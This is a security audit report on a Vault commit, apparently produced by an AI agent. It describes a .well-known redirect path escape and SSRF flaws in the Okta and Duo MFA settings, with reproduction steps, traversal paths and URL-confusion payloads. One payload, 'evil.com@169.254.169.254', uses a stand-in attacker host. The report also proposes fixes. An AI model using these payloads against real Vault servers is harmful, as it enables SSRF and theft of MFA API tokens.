# Vault security review (commit 0513545dd)

Focus: less-discussed paths outside prior ACME SSRF / raft join SSRF / DB template SQLi / cert OCSP fail-open / ACL template injection.

Validated medium+ findings: 3. Speculative items that did not meet the bar are listed briefly at the end.

---

## Finding 1 — Medium: `.well-known` redirect path escape to arbitrary `/v1/*` routes

### Location
- `vault/well_known_redirect.go` — `(*wellKnownRedirect).Destination`
- `vault/core.go` — `(*Core).GetWellKnownRedirect`
- `http/handler.go` — `wrapGenericHandler` (`.well-known` branch)

### Attacker
Unauthenticated HTTP client, **after** any mount/plugin has registered a well-known label via `RequestWellKnownRedirect` (plugin ExtendedSystemView API). No builtin in this OSS tree currently registers one, but the API is public and HA/external tests exercise it; any plugin that registers a label enables the bug.

### Controlled fields
Path suffix after `/.well-known/<registered-label>/…` (absolute path, `..` segments, or `?`/`#` pollution).

### Reachability
1. Plugin registers e.g. label `openid-configuration` → dest under a mount.
2. Attacker: `GET /.well-known/openid-configuration/sys/unseal` using remaining=`/sys/unseal` (or `../../../../sys/health`).
3. `Destination` uses `url.ResolveReference` on attacker-controlled `remaining`.
4. Absolute `remaining` replaces the intended dest entirely.
5. `GetWellKnownRedirect` returns `path.Join("/v1", dest)` → e.g. `/v1/sys/unseal`.
6. Handler rewrites `URL.Path` and recursively serves the request.

Verified mappings (registered dest `identity/oidc/.well-known/openid-configuration`):

| remaining | final path |
|-----------|------------|
| `/sys/unseal` | `/v1/sys/unseal` |
| `/sys/init` | `/v1/sys/init` |
| `/sys/raw/...` | `/v1/sys/raw/...` |
| `/sys/mfa/validate` | `/v1/sys/mfa/validate` |
| `../../../../sys/health` | `/v1/sys/health` |

### Why authZ does not stop it
Registration is intended only to map discovery URLs into mount-local paths. There is **no** allowlist that `remaining` stay under the registered prefix. Vault ACL still applies on the **rewritten** path, so this is not a direct ACL bypass—but it defeats reverse-proxy / WAF path allowlists that only expose `/.well-known/*`, and it reaches the same unauthenticated mutating surfaces (`sys/unseal`, `sys/init`, raft join, generate-root, MFA validate, etc.) under a non-`/v1` URL shape. Audit `RequestURI` retains the `.well-known` path while `URL.Path` is rewritten.

### Impact
Path-normalization / gateway-bypass primitive to any `/v1/*` API whenever a well-known redirect exists. Not “admin can admin”: trigger is unauthenticated once a redirect is registered (often by OIDC/ACME-style plugins).

### Not just admin
Unauthenticated caller; prerequisite is presence of a registered label (plugin feature), not root.

---

## Finding 2 — Medium/High: Okta Login MFA `base_url` / `org_name` URL confusion → SSRF + API token exfiltration

### Location
- `vault/login_mfa.go` — `parseOktaConfig` (broken validation)
- `vault/login_mfa.go` — `(*Core).validateOkta` (runtime URL build + client)

### Attacker
Identity operator with `update` on `identity/mfa/method/okta` (or typed equivalents). **Not** in `api.SudoPaths`—unlike `sys/audit`. Then any login subject to that MFA method triggers outbound requests.

### Controlled fields
`org_name`, `base_url` (and `api_token` they supply).

### Reachability
1. `POST /v1/identity/mfa/method/okta` with e.g. `base_url=evil.com@169.254.169.254` (or `org_name=attacker.com#`).
2. Validation parses `https://%s,%s` (**comma**)—does not match runtime format and does not reject `@` / `#` / `/` confusion.
3. Attach method to a login enforcement.
4. Victim (or attacker) authenticates; MFA required.
5. `POST /v1/sys/mfa/validate` (unauthenticated) → `validateOkta` builds `https://%s.%s` (**dot**) and creates Okta client with `WithToken(api_token)`.

Confirmed `url.Parse` results:

| org / base | Host | Userinfo |
|------------|------|----------|
| `myorg` / `evil.com@169.254.169.254` | `169.254.169.254` | `myorg.evil.com` |
| `attacker.com#` / `okta.com` | `attacker.com` | (none) |
| `attacker.com/` / `okta.com` | `attacker.com` | path `/.okta.com` |

### Why authZ does not stop it
MFA method write is a normal identity ACL, not sudo. Intended capability is “point Vault at Okta,” not “open arbitrary host with Bearer token.” Broken validator gives false confidence.

### Impact
- SSRF to link-local/metadata/internal HTTP endpoints during MFA validation.
- Exfiltration of Okta API token to attacker-controlled host.
- Triggerable by unauthenticated `sys/mfa/validate` once config is planted.

### Not just admin
Delegated MFA/identity admins without root/sudo; credential theft + cloud-metadata SSRF exceed “configure Okta org.”

---

## Finding 3 — Medium: Duo Login MFA `api_hostname` unrestricted → SSRF + Duo key use

### Location
- `vault/login_mfa.go` — `parseDuoConfig` (no host validation)
- `vault/login_mfa.go` — `(*Core).validateDuo` (`duoapi.NewDuoApi(..., APIHostname, ...)`)

### Attacker
Same class as Finding 2: `update` on `identity/mfa/method/duo` (no sudo).

### Controlled fields
`api_hostname`, plus `integration_key` / `secret_key` they set.

### Reachability
1. Write Duo MFA method with `api_hostname` = internal IP or attacker host.
2. Enforcement on an auth mount.
3. Login → `sys/mfa/validate` → `validateDuo` calls Duo SDK `Check` / `Preauth` / `Auth` against that host using integration + secret keys.

### Why authZ does not stop it
Same as Okta: identity ACL only; no hostname allowlist (unlike expecting `api-*.duosecurity.com`).

### Impact
SSRF from Vault server; Duo integration/secret keys sent to attacker or internal services on MFA validate (unauthenticated endpoint).

### Not just admin
Same delegated MFA-admin model; not root-only; not equivalent to intentional “call Duo SaaS.”

---

## Explicitly checked / not claimed as medium+

| Area | Verdict |
|------|---------|
| CORS `*` reflecting Origin | Misconfig risk; no `Allow-Credentials`; token-header model limits CSRF |
| Cert `fetchCRL` `http.Get(url)` | Admin-configured CDP URL; sudo-adjacent cert auth admin; no new evidence beyond known SSRF class |
| OCSP AIA from leaf (`subject.OCSPServer`) | Contacts cert AIA when OCSP on; fail-open already flagged; SSRF needs CA-issued malicious AIA |
| Audit socket/file | `sys/audit` is **sudo**; classic “admin SSRF,” weaker than MFA findings |
| Raft join / ACME / DB templates / ACL templates | Deferred per prior agents |
| Identity group hierarchy | Cycle checks present; writing privileged group membership needs write on that group |
| Token create orphan/root | Sudo/root checks present for orphan and root policy |
| AppRole `bind_secret_id=false` | By design with CIDR constraints |
| LDAP user/group filters | Usernames escaped via `ldap.EscapeFilter` |
| Cubbyhole / transit cross-token | No new cross-token leak validated |
| Agent templates | Local agent config, not remotely triggerable via Vault HTTP API alone |
| `sys/raw` | Disabled by default; sudo when enabled |
| Plugin `Response.Redirect` | HTTP layer honors it; no in-tree setter found |
| JWT/OIDC/Azure/GCP auth builtins | Not present under `builtin/credential` in this tree (external plugins) |

---

## Suggested fixes (guidance only)

1. **Well-known**: Reject `remaining` that is absolute, contains `..`, or changes scheme/host; require cleaned path stay under registered dest prefix; do not `ResolveReference` untrusted input.
2. **Okta MFA**: Validate with the **same** format as runtime (`https://%s.%s`); require host match `*.okta.com` / `*.oktapreview.com` (or explicit allowlist); reject `@`, userinfo, fragments, and path in org/base.
3. **Duo MFA**: Allowlist Duo API hostnames (or HTTPS + public suffix allowlist); reject raw IPs unless explicitly enabled.
